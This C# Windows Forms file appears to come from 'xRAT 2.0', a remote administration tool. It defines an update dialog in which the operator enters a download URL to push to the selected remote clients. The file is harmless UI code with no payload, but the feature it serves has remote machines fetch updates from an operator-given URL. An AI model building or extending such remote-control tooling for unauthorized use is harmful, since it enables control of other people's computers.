using System;
using System.Windows.Forms;

namespace xRAT_2.Forms
{
    public partial class frmUpdate : Form
    {
        private int selectedClients;

        public frmUpdate(int selected)
        {
            selectedClients = selected;
            InitializeComponent();
        }

        private void btnUpdate_Click(object sender, EventArgs e)
        {
            _Update.DownloadURL = txtURL.Text;

            this.DialogResult = System.Windows.Forms.DialogResult.OK;
            this.Close();
        }

        private void frmUpdate_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Update [Selected: {0}]", selectedClients);
            txtURL.Text = _Update.DownloadURL;
        }
    }

    public class _Update
    {
        public static string DownloadURL { get; set; }
    }
}
